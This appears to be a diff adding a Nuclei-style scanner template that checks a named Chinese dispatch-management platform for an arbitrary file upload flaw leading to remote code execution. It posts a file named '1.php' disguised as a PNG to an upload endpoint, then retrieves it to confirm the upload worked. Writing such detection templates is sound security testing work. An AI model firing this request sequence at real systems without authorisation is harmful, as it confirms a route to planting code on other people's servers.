@@ -1,0 +1,58 @@
+id: event-uploadfile
+info:
+  name: 福建科立讯通信有限公司指挥调度管理平台RCE_event-uploadfile接口任意上传
+  author: wayxz
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /api/client/event/uploadfile.php HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary25qW4eG1Jt50iyf7
+        Content-Length: 372
+
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7
+        Content-Disposition: form-data; name="uuid"
+
+          1
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7
+        Content-Disposition: form-data; name="number"
+
+          1
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7
+        Content-Disposition: form-data; name="uploadfile";filename="1.php"
+        Content-Type: image/png
+
+          111
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7--
+
+      - |
+        GET /upload/task/{{timestrp}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+
+    extractors:
+     - type: regex
+       name: timestrp
+       internal: true
+       part: body
+       regex:
+          - '[0-9a-zA-Z]{8}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{12}.php'  
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "111"
+      - type: status
+        status:
+          - 200
